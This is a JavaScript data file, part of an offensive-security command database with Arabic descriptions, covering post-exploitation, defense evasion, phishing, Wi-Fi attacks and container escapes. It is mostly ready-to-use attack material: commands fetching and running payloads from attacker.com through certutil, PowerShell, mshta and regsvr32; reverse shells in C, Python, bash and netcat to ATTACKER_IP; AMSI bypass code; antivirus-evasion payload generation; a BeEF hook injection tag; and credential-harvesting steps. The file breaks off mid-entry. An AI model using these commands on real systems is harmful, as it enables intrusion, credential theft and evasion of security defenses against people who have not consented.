// ===================================================
// KALI LINUX MASTER COMMANDS DATABASE – PART 12
// Categories: Scripting, Automation, Post-Exploitation, Defense Evasion
// ===================================================

const CMD_PART12 = [

// ─── BASH SCRIPTING & AUTOMATION ──────────────────
{
  id: 1201, name: 'bash-pentest-script', cat: 'scripting', level: 'intermediate',
  syntax: 'bash script.sh [ARGS]',
  short: 'كتابة سكريبتات Bash لأتمتة اختبار الاختراق',
  desc: `Bash scripting ضروري لأتمتة مهام اختبار الاختراق. يجمع نتائج أدوات متعددة، يشغل scans تلقائياً، ويعالج النتائج.`,
  options: [
    { flag: '#!/bin/bash', desc: 'Shebang لتحديد المفسر' },
    { flag: '-e', desc: 'الخروج عند الخطأ' },
    { flag: '-x', desc: 'Debug mode' },
  ],
  examples: [
    { cmd: `#!/bin/bash
TARGET=$1
echo "[*] Starting recon on $TARGET"
nmap -sV -sC $TARGET -oA nmap_$TARGET
theHarvester -d $TARGET -b google -f harvest_$TARGET
subfinder -d $TARGET -o subs_$TARGET.txt
echo "[+] Done!"`, desc: 'سكريبت استطلاع تلقائي' },
    { cmd: `for ip in $(cat hosts.txt); do
  ping -c 1 $ip > /dev/null && echo "$ip is UP"
done`, desc: 'فحص مجموعة hosts' },
    { cmd: "while IFS=: read user pass; do\n  sshpass -p $pass ssh $user@target 2>/dev/null && echo \"SUCCESS: $user:$pass\"\ndone < creds.txt", desc: 'اختبار credentials من قائمة' },
  ],
  tips: '💡 استخدم parallel لتسريع تنفيذ السكريبت: cat hosts.txt | parallel nmap -sV {}',
  related: ['nmap', 'python-pentest', 'bash-oneliners'],
},
{
  id: 1202, name: 'python-pentest', cat: 'scripting', level: 'intermediate',
  syntax: 'python3 script.py [ARGS]',
  short: 'Python لكتابة أدوات اختبار الاختراق',
  desc: `Python اللغة الأكثر استخداماً في الأمن السيبراني. تُستخدم لكتابة exploits، scripts، networking tools، وعمل automation للمهام المتكررة.`,
  options: [],
  examples: [
    { cmd: `import socket, threading
def scan_port(ip, port):
    try:
        s = socket.socket()
        s.settimeout(0.5)
        s.connect((ip, port))
        print(f"[+] Port {port} OPEN")
        s.close()
    except: pass

for p in range(1, 1001):
    threading.Thread(target=scan_port, args=("192.168.1.1", p)).start()`, desc: 'Port scanner بـ Python' },
    { cmd: `import requests
for word in open('wordlist.txt').readlines():
    url = f"http://target.com/{word.strip()}"
    r = requests.get(url)
    if r.status_code == 200:
        print(f"[+] Found: {url}")`, desc: 'Directory bruteforce بـ Python' },
    { cmd: 'python3 -m http.server 80', desc: 'HTTP server سريع لنقل الملفات' },
  ],
  tips: '💡 مكتبات مهمة: requests, scapy, paramiko, impacket, pwntools.',
  related: ['bash-pentest-script', 'pwntools', 'scapy'],
},
{
  id: 1203, name: 'scapy', cat: 'network', level: 'advanced',
  syntax: 'from scapy.all import *',
  short: 'صياغة وتحليل حزم الشبكة بـ Python',
  desc: `Scapy مكتبة Python قوية لإنشاء وتحليل وإرسال حزم الشبكة. تتيح صياغة أي بروتوكول: TCP، UDP، ICMP، ARP، DNS، HTTP يدوياً.`,
  options: [],
  examples: [
    { cmd: "from scapy.all import *\npkt = IP(dst='192.168.1.1')/TCP(dport=80, flags='S')\nresp = sr1(pkt, timeout=1)\nif resp and resp.haslayer(TCP):\n    print('Port 80 OPEN' if resp[TCP].flags == 0x12 else 'CLOSED')", desc: 'SYN Port Scanner' },
    { cmd: "from scapy.all import *\nsniff(iface='eth0', prn=lambda x: x.summary(), count=10)", desc: 'التقاط 10 حزم' },
    { cmd: "from scapy.all import *\nsend(IP(dst='target')/ICMP(), count=100)", desc: 'إرسال ICMP packets' },
    { cmd: "wrpcap('capture.pcap', packets)\nrdpcap('capture.pcap')", desc: 'حفظ وقراءة ملفات PCAP' },
  ],
  tips: '💡 Scapy يمكنه محاكاة أي هجوم شبكي وبناء أدوات مخصصة.',
  related: ['python-pentest', 'wireshark', 'hping3'],
},

// ─── POST-EXPLOITATION ─────────────────────────────
{
  id: 1204, name: 'empire', cat: 'exploitation', level: 'advanced',
  syntax: 'sudo powershell-empire server / client',
  short: 'إطار Post-Exploitation الاحترافي',
  desc: `PowerShell Empire إطار post-exploitation قوي. يعمل في الذاكرة بدون ملفات (fileless)، يدعم Windows وLinux وMac، ويوفر agents وmodules وlisteners متعددة.`,
  options: [
    { flag: 'listeners', desc: 'إدارة المستمعين' },
    { flag: 'stagers', desc: 'إنشاء payloads' },
    { flag: 'agents', desc: 'إدارة الأجهزة المخترقة' },
    { flag: 'usemodule', desc: 'تحميل module محدد' },
  ],
  examples: [
    { cmd: 'sudo powershell-empire server --restip 127.0.0.1 --restport 1337', desc: 'تشغيل Empire server' },
    { cmd: 'powershell-empire client\nlisteners\nuselistener http\nset Host http://ATTACKER_IP\nexecute', desc: 'إنشاء HTTP listener' },
    { cmd: 'usestager windows/launcher_bat\nset Listener http_listener\nexecute', desc: 'إنشاء Windows stager' },
    { cmd: 'usemodule powershell/privesc/bypassuac\nset Agent AGENT_NAME\nexecute', desc: 'تجاوز UAC' },
  ],
  tips: '💡 استخدم Covenant أو Havoc كبدائل حديثة لـ Empire.',
  related: ['meterpreter', 'msfvenom', 'crackmapexec'],
},
{
  id: 1205, name: 'covenant', cat: 'exploitation', level: 'advanced',
  syntax: 'dotnet run --project Covenant/Covenant.csproj',
  short: 'إطار C2 حديث للـ Post-Exploitation',
  desc: `Covenant إطار C2 (Command & Control) حديث مبني على .NET. يعمل عبر HTTPS مع HTTP Profiles قابلة للتخصيص لتجاوز الكشف.`,
  options: [],
  examples: [
    { cmd: 'cd Covenant && dotnet run', desc: 'تشغيل Covenant' },
    { cmd: '# زيارة https://localhost:7443', desc: 'فتح واجهة الويب' },
    { cmd: '# Listeners > Create > HTTPS', desc: 'إنشاء HTTPS listener' },
    { cmd: '# Launchers > PowerShell > Generate', desc: 'توليد PowerShell launcher' },
  ],
  tips: '💡 Havoc Framework بديل أحدث وأقل كشفاً.',
  related: ['empire', 'meterpreter', 'cobalt-strike'],
},
{
  id: 1206, name: 'lolbins', cat: 'exploitation', level: 'intermediate',
  syntax: '# Living off the Land Binaries',
  short: 'استخدام أدوات Windows المدمجة للهجوم',
  desc: `LOLBins (Living off the Land Binaries) هي أدوات Windows شرعية تُستخدم لأغراض خبيثة. تجتاز مضادات الفيروسات لأنها موثوقة من Windows.`,
  options: [],
  examples: [
    { cmd: 'certutil.exe -urlcache -split -f http://attacker.com/shell.exe shell.exe', desc: 'تحميل ملف بـ certutil (بديل wget)' },
    { cmd: 'powershell.exe -c "IEX(New-Object Net.WebClient).DownloadString(\'http://attacker.com/payload.ps1\')"', desc: 'تنفيذ PowerShell من الذاكرة' },
    { cmd: 'mshta.exe http://attacker.com/payload.hta', desc: 'تنفيذ HTA عن بُعد' },
    { cmd: 'regsvr32.exe /s /n /u /i:http://attacker.com/payload.sct scrobj.dll', desc: 'تنفيذ SCT عبر regsvr32' },
    { cmd: 'wmic.exe process call create "cmd.exe /c whoami > C:\\output.txt"', desc: 'تنفيذ أوامر عبر WMIC' },
  ],
  tips: '💡 موقع lolbas-project.github.io يوثق 200+ LOLBin.',
  related: ['empire', 'meterpreter', 'lolbas'],
},

// ─── DEFENSE EVASION ───────────────────────────────
{
  id: 1207, name: 'veil', cat: 'exploitation', level: 'advanced',
  syntax: 'veil',
  short: 'تجاوز مضادات الفيروسات بـ Veil Framework',
  desc: `Veil Framework ينشئ payloads تتجاوز مضادات الفيروسات. يدعم Python وPowerShell وC++ payloads مع تقنيات obfuscation متعددة.`,
  options: [
    { flag: 'list', desc: 'عرض الـ payloads المتاحة' },
    { flag: 'use', desc: 'اختيار payload' },
    { flag: 'generate', desc: 'توليد الـ payload' },
  ],
  examples: [
    { cmd: 'veil\nuse 1\nlist\nuse python/meterpreter/rev_https\nset LHOST 192.168.1.5\nset LPORT 4444\ngenerate', desc: 'إنشاء Python Meterpreter' },
    { cmd: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -e x64/xor_dynamic -i 15 -f raw | shellter -a -f template.exe -p -', desc: 'Shellter لحقن Payload في EXE شرعي' },
    { cmd: 'python3 Freeze.py -I payload.exe -O output.exe', desc: 'Freeze لتشفير PE binaries' },
  ],
  tips: '💡 Shellter أفضل من Veil لحقن payloads في ملفات EXE شرعية.',
  related: ['msfvenom', 'empire', 'shellter'],
},
{
  id: 1208, name: 'amsi-bypass', cat: 'exploitation', level: 'advanced',
  syntax: '# PowerShell AMSI Bypass techniques',
  short: 'تجاوز Windows AMSI لتنفيذ PowerShell',
  desc: `AMSI (Antimalware Scan Interface) يفحص PowerShell scripts قبل التنفيذ. هناك تقنيات متعددة لتجاوزه مطلوبة في pentest على بيئات Windows.`,
  options: [],
  examples: [
    { cmd: "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)", desc: 'تجاوز AMSI الكلاسيكي (معروف الآن)' },
    { cmd: "# Obfuscated version:\n$a='System.Management.Automation.A'+'msiUtils'\n$b=[Ref].Assembly.GetType($a)\n$b.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)", desc: 'تجاوز AMSI مع obfuscation' },
    { cmd: 'Invoke-Obfuscation  # أداة لـ obfuscate PowerShell', desc: 'أداة Invoke-Obfuscation' },
    { cmd: "powershell.exe -exec bypass -c 'COMMAND'", desc: 'تشغيل PS بتجاوز Execution Policy' },
  ],
  tips: '💡 امتيازات LocalAdmin مطلوبة لبعض AMSI bypasses.',
  related: ['empire', 'lolbins', 'veil'],
},

// ─── PHISHING / SOCIAL ENGINEERING ────────────────
{
  id: 1209, name: 'gophish', cat: 'exploitation', level: 'intermediate',
  syntax: './gophish',
  short: 'إطار Phishing احترافي مع لوحة تحكم',
  desc: `GoPhish إطار Phishing مفتوح المصدر بواجهة ويب. يتيح إنشاء حملات phishing، تتبع النقرات والإدخالات، وإنشاء تقارير تفصيلية.`,
  options: [],
  examples: [
    { cmd: './gophish\n# زيارة https://localhost:3333', desc: 'تشغيل GoPhish' },
    { cmd: '# Sending Profiles > SMTP Config\n# Email Templates > إنشاء بريد مقنع\n# Landing Pages > صفحة phishing\n# Campaigns > إطلاق الحملة', desc: 'إعداد حملة Phishing' },
    { cmd: '# Dashboard > Results > تتبع النقرات والإدخالات', desc: 'متابعة نتائج الحملة' },
    { cmd: 'evilginx2 -p /usr/share/evilginx/phishlets/', desc: 'بديل: Evilginx2 لسرقة Cookies عبر Proxy' },
  ],
  tips: '💡 Evilginx2 أقوى لسرقة session cookies وتجاوز 2FA.',
  related: ['seToolkit', 'evilginx', 'beef'],
},
{
  id: 1210, name: 'set-toolkit', cat: 'exploitation', level: 'intermediate',
  syntax: 'sudo setoolkit',
  short: 'Social Engineering Toolkit (SET)',
  desc: `SET أداة Social Engineering احترافية. تحتوي على: Spear Phishing، Credential Harvesting، Web Attack vectors، Wireless AP spoofing وأكثر.`,
  options: [],
  examples: [
    { cmd: 'sudo setoolkit\n# 1) Social-Engineering Attacks\n# 2) Website Attack Vectors\n# 3) Credential Harvester Attack Method\n# 2) Site Cloner\n# أدخل URL الهدف', desc: 'استنساخ موقع لسرقة بيانات الدخول' },
    { cmd: '# SET > 1 > 1 > Spear Phishing\n# إنشاء رسائل Spear Phishing موجهة', desc: 'Spear Phishing Email' },
    { cmd: 'sudo setoolkit\n# 1 > 6 > Arduino\n# أو WiFi AP vectors', desc: 'WiFi AP Spoofing' },
  ],
  tips: '💡 GoPhish أسهل للحملات الكبيرة، SET للهجمات الموجهة.',
  related: ['gophish', 'evilginx', 'msfvenom'],
},
{
  id: 1211, name: 'beef-xss', cat: 'webapp', level: 'intermediate',
  syntax: 'sudo beef-xss',
  short: 'إطار استغلال المتصفحات عبر XSS',
  desc: `BeEF (Browser Exploitation Framework) يستغل ثغرات XSS للسيطرة على المتصفح. بمجرد تحميل hook.js يمكن: تنفيذ JS، keylogging، screenshot، Phishing داخل المتصفح، وإطلاق هجمات شبكية.`,
  options: [],
  examples: [
    { cmd: 'sudo beef-xss\n# زيارة http://localhost:3000/ui/panel', desc: 'تشغيل BeEF' },
    { cmd: '<script src="http://ATTACKER_IP:3000/hook.js"></script>', desc: 'Hook payload للحقن في صفحة مخترقة' },
    { cmd: '# Dashboard > Commands > Browser > Fingerprint', desc: 'بصمة المتصفح' },
    { cmd: '# Commands > Network > Get Internal IP', desc: 'الحصول على IP الداخلي للضحية' },
  ],
  tips: '💡 BeEF يعمل بشكل أفضل على HTTP (بدون HTTPS).',
  related: ['burpsuite', 'xsstrike', 'gophish'],
},

// ─── WIRELESS ATTACKS ──────────────────────────────
{
  id: 1212, name: 'evil-twin', cat: 'wireless', level: 'advanced',
  syntax: '# Evil Twin Attack using hostapd-wpe',
  short: 'هجوم Evil Twin لسرقة بيانات WiFi',
  desc: `هجوم Evil Twin ينشئ AP مزيف بنفس اسم الشبكة الحقيقية. يخدع الأجهزة للاتصال به، ثم يطلب بيانات الدخول أو يستخرج هاش WPA.`,
  options: [],
  examples: [
    { cmd: '# بـ airbase-ng:\nairmon-ng start wlan0\nairbase-ng -a TARGET_AP_MAC -e "TARGET_SSID" -c CHANNEL wlan0mon\n# ثم DHCP server + Captive Portal', desc: 'Evil Twin بـ airbase-ng' },
    { cmd: 'hostapd-wpe hostapd-wpe.conf  # لشبكات Enterprise WPA', desc: 'Evil Twin لشبكات Enterprise' },
    { cmd: 'wifiphisher --essid "TARGET_SSID" -aI wlan0 -jI wlan1 -p oauth-login', desc: 'Evil Twin بـ Wifiphisher' },
    { cmd: '# Fluxion\npython3 fluxion.py', desc: 'Evil Twin بـ Fluxion' },
  ],
  tips: '💡 Wifiphisher أسهل وأكثر أتمتة لهجمات Evil Twin.',
  related: ['aircrack-ng', 'bettercap-wifi', 'wifite'],
},
{
  id: 1213, name: 'wifiphisher', cat: 'wireless', level: 'intermediate',
  syntax: 'sudo wifiphisher [OPTIONS]',
  short: 'هجمات Social Engineering لشبكات WiFi',
  desc: `Wifiphisher أداة متخصصة في هجمات Phishing لشبكات WiFi. تنشئ Rogue AP وتعرض صفحات Captive Portal مقنعة لسرقة WPA passwords.`,
  options: [
    { flag: '--essid SSID', desc: 'اسم الشبكة المستهدفة' },
    { flag: '-aI wlan0', desc: 'واجهة AP الخاصة' },
    { flag: '-jI wlan1', desc: 'واجهة Internet' },
    { flag: '-p SCENARIO', desc: 'نوع الهجوم (oauth-login, firmware-upgrade)' },
  ],
  examples: [
    { cmd: 'sudo wifiphisher --essid "TARGET_WIFI" -p firmware-upgrade', desc: 'هجوم firmware update مزيف' },
    { cmd: 'sudo wifiphisher -aI wlan0 -jI wlan1 --essid "FreeWiFi" -p oauth-login', desc: 'Captive Portal OAuth مزيف' },
    { cmd: 'sudo wifiphisher -aI wlan0 --essid "TARGET" -p plugin_update', desc: 'هجوم plugin update مزيف' },
  ],
  tips: '💡 تحتاج بطاقتين wifi: واحدة للـ AP وأخرى للـ internet.',
  related: ['evil-twin', 'aircrack-ng', 'set-toolkit'],
},

// ─── ADDITIONAL LINUX TOOLS ────────────────────────
{
  id: 1214, name: 'tmux-pentest', cat: 'linux', level: 'beginner',
  syntax: 'tmux [COMMAND]',
  short: 'Terminal Multiplexer لاختبار الاختراق',
  desc: `tmux ضروري في pentest لإدارة جلسات متعددة في نافذة واحدة. يحتفظ بالجلسات حتى عند قطع الاتصال عبر SSH.`,
  options: [
    { flag: 'new -s NAME', desc: 'جلسة جديدة' },
    { flag: 'attach -t NAME', desc: 'إعادة الاتصال بجلسة' },
    { flag: 'split-window', desc: 'تقسيم النافذة' },
    { flag: 'Ctrl+b d', desc: 'فصل الجلسة (detach)' },
  ],
  examples: [
    { cmd: 'tmux new -s pentest', desc: 'إنشاء جلسة pentest' },
    { cmd: 'Ctrl+b %  # تقسيم عمودي\nCtrl+b "  # تقسيم أفقي\nCtrl+b arrow  # التنقل', desc: 'تقسيم النافذة' },
    { cmd: 'tmux attach -t pentest', desc: 'إعادة الاتصال بالجلسة' },
    { cmd: 'tmux ls', desc: 'عرض جميع الجلسات' },
  ],
  tips: '💡 استخدم tmux في كل اتصال SSH حتى لا تفقد عملك عند انقطاع الاتصال.',
  related: ['screen', 'ssh', 'bash-pentest-script'],
},
{
  id: 1215, name: 'transfer-files', cat: 'linux', level: 'beginner',
  syntax: '# Multiple file transfer methods',
  short: 'نقل الملفات في اختبار الاختراق',
  desc: `نقل الملفات بين الأجهزة أثناء الاختراق يحتاج طرقاً متعددة حسب البيئة. من HTTP server بسيط حتى SCP وBase64.`,
  options: [],
  examples: [
    { cmd: '# على جهازك (attacker):\npython3 -m http.server 8080\n# على الضحية:\nwget http://ATTACKER_IP:8080/file.exe', desc: 'نقل عبر HTTP server' },
    { cmd: '# Netcat transfer:\n# المرسل: cat file | nc -l -p 4444\n# المستقبل: nc SENDER_IP 4444 > file', desc: 'نقل عبر Netcat' },
    { cmd: 'scp file.txt user@target:/tmp/', desc: 'نقل عبر SCP' },
    { cmd: "# Base64 encoding:\nbase64 file.exe\n# على الضحية:\necho 'BASE64_DATA' | base64 -d > file.exe", desc: 'نقل عبر Base64 (في terminal)' },
    { cmd: 'impacket-smbserver share /path/to/share -smb2support', desc: 'SMB server لنقل للـ Windows' },
  ],
  tips: '💡 certutil على Windows يمكنه تحميل ملفات كـ LOLBin.',
  related: ['netcat', 'impacket-secretsdump', 'meterpreter'],
},
{
  id: 1216, name: 'wordlist-tools', cat: 'linux', level: 'beginner',
  syntax: '# Wordlist management tools',
  short: 'إدارة وإنشاء قوائم الكلمات',
  desc: `قوائم الكلمات (wordlists) أساسية في bruteforce وfuzzing. Kali تأتي بـ rockyou.txt الشهيرة في /usr/share/wordlists/. يمكن إنشاء قوائم مخصصة بأدوات متعددة.`,
  options: [],
  examples: [
    { cmd: 'ls /usr/share/wordlists/\ngzip -d /usr/share/wordlists/rockyou.txt.gz', desc: 'استخدام قوائم Kali' },
    { cmd: 'cewl http://target.com -d 3 -m 6 > wordlist.txt', desc: 'قائمة من موقع الهدف' },
    { cmd: 'crunch 8 12 abcdefghijklmnopqrstuvwxyz0123456789 -o custom.txt', desc: 'قائمة بنمط محدد' },
    { cmd: "cat rockyou.txt | awk 'length($0) >= 8 && length($0) <= 12' > filtered.txt", desc: 'فلترة القائمة بطول محدد' },
    { cmd: "hashcat rockyou.txt -r /usr/share/hashcat/rules/best64.rule --stdout | sort -u > mega_list.txt", desc: 'توسيع القائمة بـ hashcat rules' },
  ],
  tips: '💡 SecLists مجموعة ممتازة من قوائم الكلمات: git clone https://github.com/danielmiessler/SecLists',
  related: ['hashcat', 'john', 'crunch'],
},
{
  id: 1217, name: 'custom-payloads', cat: 'exploitation', level: 'advanced',
  syntax: '# Custom payload crafting',
  short: 'صياغة Payloads مخصصة',
  desc: `الـ payloads المخصصة أقل كشفاً من الجاهزة. يمكن صياغتها بـ C، Python، PowerShell مع تقنيات تشفير وobfuscation.`,
  options: [],
  examples: [
    { cmd: `// C Reverse Shell:
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
int main() {
    int s = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in sa = {AF_INET, htons(4444), {inet_addr("ATTACKER_IP")}};
    connect(s, (struct sockaddr*)&sa, sizeof(sa));
    dup2(s, 0); dup2(s, 1); dup2(s, 2);
    execl("/bin/sh", "sh", NULL);
}`, desc: 'Reverse Shell بـ C' },
    { cmd: `python3 -c "import socket,os,pty;s=socket.socket();s.connect(('ATTACKER_IP',4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn('/bin/bash')"`, desc: 'Python Reverse Shell One-liner' },
    { cmd: `bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1`, desc: 'Bash Reverse Shell' },
    { cmd: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f`, desc: 'Netcat Reverse Shell' },
  ],
  tips: '💡 revshells.com يولد reverse shells بجميع اللغات.',
  related: ['msfvenom', 'netcat', 'pwntools'],
},
{
  id: 1218, name: 'password-analysis', cat: 'exploitation', level: 'intermediate',
  syntax: '# Password analysis and cracking workflow',
  short: 'تحليل وكسر كلمات المرور - منهجية كاملة',
  desc: `منهجية كاملة لكسر كلمات المرور: تحديد نوع الهاش، اختيار الأداة المناسبة، والاستراتيجية الصحيحة.`,
  options: [],
  examples: [
    { cmd: "hashid '$2y$10$...' # كشف نوع الهاش\nhash-identifier '5d41402abc4b...'", desc: 'تحديد نوع الهاش' },
    { cmd: 'hashcat -a 0 -m 1000 hash.txt rockyou.txt  # NTLM + dictionary\nhashcat -a 3 -m 1000 hash.txt ?u?l?l?l?d?d  # Mask attack', desc: 'كسر NTLM بـ hashcat' },
    { cmd: 'john hash.txt --format=bcrypt --wordlist=rockyou.txt', desc: 'كسر bcrypt بـ john' },
    { cmd: 'hashcat --example-hashes | grep -A 2 "MODE: 1800"  # SHA-512crypt', desc: 'مثال لـ Linux /etc/shadow' },
  ],
  tips: '💡 ntlm.pw و crackstation.net لكسر هاشات شائعة online.',
  related: ['hashcat', 'john', 'hydra'],
},

// ─── CONTAINER SECURITY ────────────────────────────
{
  id: 1219, name: 'docker-escape', cat: 'exploitation', level: 'advanced',
  syntax: '# Docker container escape techniques',
  short: 'الهروب من Docker Containers',
  desc: `Docker container escape يستغل misconfigurations للوصول لنظام المضيف. أشهر الطرق: privilege container، mounted sockets، capabilities.`,
  options: [],
  examples: [
    { cmd: '# فحص هل أنت داخل container:\ncat /proc/1/cgroup | grep docker\nls /.dockerenv', desc: 'التحقق من وجود container' },
    { cmd: '# Privileged container escape:\nmount /dev/sda1 /mnt\nchroot /mnt bash', desc: 'Escape من Privileged Container' },
    { cmd: '# Docker socket escape:\nls -la /var/run/docker.sock  # إذا موجود:\ndocker run -it -v /:/host alpine chroot /host', desc: 'Escape عبر Docker Socket المكشوف' },
    { cmd: 'capsh --print | grep cap_sys_admin  # فحص capabilities\ncdk evaluate', desc: 'أداة CDK لفحص container escape' },
  ],
  tips: '💡 CDK (Container Definition Kit) أفضل أداة لـ container security assessment.',
  related: ['pwndbg', 'linux-privesc', 'docker'],
},
{
  id: 1220, name: 'kubernetes-pentest', cat: 'exploitation', level: 'advanced',
  syntax: 'kubectl [COMMAND] [OPTIONS]',
  short: 'اختبار اختراق Kubernetes',
  desc: `اختبار بيئات Kubernetes يشمل: RBAC misconfiguration، exposed API servers، privilege escalation عبر service accounts، وsecrets enumeration.`,
  options: [],
  examples: [
    { cmd: 'kubectl cluster-info  # معلومات الـ cluster\nkubectl get nodes\nkubectl get pods --all-namespaces', desc: 'استطلاع Kubernetes cluster' },
    { cmd: 'kubectl get secrets --all-namespaces\nkubectl describe secret SECRET_NAME', desc: 'سحب Kubernetes Secrets' },
    { cmd: 'kubectl run pwn --image=alpine --rm -it --restart=Never -- sh\n# داخل pod: mount node filesystem', desc: 'إنشاء Privileged Pod' },
    { cmd: 'kube-hunter --remote 192.168.1.100', desc: 'kube-hunter لفحص ثغرات K8s' },
  ],
  tips: '💡 kube-hunter وkube-bench لفحص أمان Kubernetes.',
  related: ['docker-escape', 'cloud-enum', 'awscli-pentest'],
},

// ─── NETWORK ANALYSIS ──────────────────────────────
{
  id: 1221, name: 'tcpdump-advanced', cat: 'network', level: 'intermediate',
  syntax: 'tcpdump [OPTIONS] [FILTER]',
  short: 'تحليل حركة الشبكة من الطرفية',
  desc: `tcpdump أداة سطر أوامر لالتقاط وتحليل حزم الشبكة. أسرع من Wireshark في الخوادم ومثالية للـ automation.`,
  options: [
    { flag: '-i IFACE', desc: 'واجهة الشبكة' },
    { flag: '-n', desc: 'عدم حل أسماء DNS' },
    { flag: '-w FILE', desc: 'حفظ في ملف PCAP' },
    { flag: '-r FILE', desc: 'قراءة ملف PCAP' },
    { flag: '-A', desc: 'عرض محتوى النص' },
  ],
  examples: [
    { cmd: 'sudo tcpdump -i eth0 -n -w capture.pcap', desc: 'التقاط جميع الحزم' },
    { cmd: "sudo tcpdump -i eth0 'port 80' -A | grep -E 'GET|POST|Host:'", desc: 'التقاط HTTP requests' },
    { cmd: "sudo tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0' -n", desc: 'التقاط SYN packets فقط' },
    { cmd: "sudo tcpdump -i eth0 'not arp and not icmp' -n -q", desc: 'إظهار TCP/UDP فقط' },
    { cmd: "tshark -r capture.pcap -T fields -e frame.time -e ip.src -e ip.dst -e http.request.uri", desc: 'تحليل PCAP بـ tshark' },
  ],
  tips: '💡 tcpdump -G 60 -w cap_%S.pcap يلتقط ملف جديد كل دقيقة.',
  related: ['wireshark', 'scapy', 'nmap'],
},
{
  id: 1222, name: 'masscan', cat: 'network', level: 'intermediate',
  syntax: 'masscan TARGET -p PORTS [OPTIONS]',
  short: 'مسح منافذ شبكات ضخمة بسرعة فائقة',
  desc: `Masscan أسرع port scanner في العالم. يمسح الإنترنت كاملاً في 6 دقائق! يستخدم في مسح نطاقات IP واسعة قبل Nmap التفصيلي.`,
  options: [
    { flag: '-p PORTS', desc: 'المنافذ (1-65535 أو 80,443,22)' },
    { flag: '--rate N', desc: 'عدد الحزم في الثانية' },
    { flag: '-oG FILE', desc: 'حفظ بصيغة grepable' },
    { flag: '--banners', desc: 'سحب banner الخدمة' },
  ],
  examples: [
    { cmd: 'sudo masscan 192.168.1.0/24 -p80,443,22,21 --rate=10000', desc: 'مسح شبكة محلية' },
    { cmd: 'sudo masscan 10.0.0.0/8 -p1-65535 --rate=100000 -oG masscan.txt', desc: 'مسح class A network' },
    { cmd: 'sudo masscan TARGET -p80 --banners --rate=1000', desc: 'مسح مع سحب HTTP banners' },
    { cmd: 'cat masscan.txt | awk \'{print $4}\' | sort -u > live_hosts.txt\nnmap -iL live_hosts.txt -sV', desc: 'pipeline مع Nmap' },
  ],
  tips: '💡 استخدم masscan للاكتشاف السريع ثم nmap للتفاصيل.',
  related: ['nmap', 'zmap', 'shodan-cli'],
},

// ─── VULNERABILITY RESEARCH ────────────────────────
{
  id: 1223, name: 'searchsploit', cat: 'exploitation', level: 'beginner',
  syntax: 'searchsploit KEYWORD',
  short: 'البحث في قاعدة بيانات Exploit-DB',
  desc: `SearchSploit واجهة سطر أوامر لـ Exploit-DB. يبحث في آلاف الـ exploits والـ PoCs المحلية بدون إنترنت.`,
  options: [
    { flag: '-t TERM', desc: 'بحث في العنوان فقط' },
    { flag: '-x PATH', desc: 'عرض محتوى الـ exploit' },
    { flag: '-m PATH', desc: 'نسخ الـ exploit للمجلد الحالي' },
    { flag: '--cve CVE-ID', desc: 'بحث برقم CVE' },
  ],
  examples: [
    { cmd: 'searchsploit apache 2.4', desc: 'بحث عن exploits Apache 2.4' },
    { cmd: 'searchsploit --cve 2021-44228  # Log4Shell', desc: 'بحث برقم CVE' },
    { cmd: 'searchsploit -x exploits/linux/remote/12345.py', desc: 'عرض كود الـ exploit' },
    { cmd: 'searchsploit -m exploits/linux/remote/12345.py', desc: 'نسخ الـ exploit للمجلد الحالي' },
    { cmd: 'searchsploit -u  # تحديث قاعدة البيانات', desc: 'تحديث Exploit-DB' },
  ],
  tips: '💡 قاعدة Exploit-DB تحتوي 50,000+ exploit. استخدمها مع CVE IDs للنتائج الأدق.',
  related: ['metasploit', 'nmap', 'nuclei'],
},
{
  id: 1224, name: 'openvas', cat: 'exploitation', level: 'intermediate',
  syntax: 'gvm-start / sudo openvas',
  short: 'فحص شامل للثغرات (Vulnerability Scanner)',
  desc: `OpenVAS/GVM أشهر vulnerability scanner مفتوح المصدر. يفحص آلاف الثغرات المعروفة مع تقارير مفصلة. مثالي للـ network vulnerability assessment.`,
  options: [],
  examples: [
    { cmd: 'sudo gvm-setup  # إعداد أولي\nsudo gvm-start', desc: 'تشغيل OpenVAS/GVM' },
    { cmd: '# زيارة: https://localhost:9392\n# Username: admin', desc: 'فتح واجهة الويب' },
    { cmd: '# Tasks > New Task > Target > Start Scan', desc: 'إنشاء فحص جديد' },
    { cmd: 'nessus  # بديل تجاري أشمل', desc: 'بديل: Nessus لمسح الثغرات' },
  ],
  tips: '💡 Nessus Essentials (مجاني) أسرع وأشمل من OpenVAS.',
  related: ['nmap', 'nuclei', 'searchsploit'],
},
{
  id: 1225, name: 'nessus', cat: 'exploitation', level: 'intermediate',
  syntax: '/etc/init.d/nessusd start',
  short: 'Vulnerability Scanner التجاري الأشهر',
  desc: `Nessus من Tenable أشهر vulnerability scanner تجاري. يحتوي 100,000+ plugin، يفحص CVEs، misconfigurations، compliance، وcredentialed scans.`,
  options: [],
  examples: [
    { cmd: 'sudo /etc/init.d/nessusd start\n# زيارة: https://localhost:8834', desc: 'تشغيل Nessus' },
    { cmd: '# New Scan > Basic Network Scan > إدخال الأهداف', desc: 'فحص شبكة أساسي' },
    { cmd: '# Credentialed Scan: أضف credentials للفحص الداخلي العميق', desc: 'فحص مع credentials' },
    { cmd: '# Reports > Export PDF > تقرير احترافي', desc: 'توليد تقرير' },
  ],
  tips: '💡 Nessus Essentials مجاني لـ 16 IP. للشبكات الكبيرة تحتاج ترخيص.',
  related: ['openvas', 'nmap', 'nuclei'],
},

// ─── ADDITIONAL CTF ────────────────────────────────
{
  id: 1226, name: 'z3-solver', cat: 'ctf', level: 'advanced',
  syntax: 'python3 -c "from z3 import *"',
  short: 'حل معادلات Constraint Satisfaction في CTF',
  desc: `Z3 SMT Solver من Microsoft يحل مسائل رياضية ومنطقية معقدة. مستخدم في CTF لكسر التحقق من كلمات المرور وفهم خوارزميات التشفير.`,
  options: [],
  examples: [
    { cmd: `from z3 import *
x, y = Ints('x y')
s = Solver()
s.add(x + y == 100, x - y == 20)
if s.check() == sat:
    print(s.model())  # x=60, y=40`, desc: 'حل نظام معادلات بسيط' },
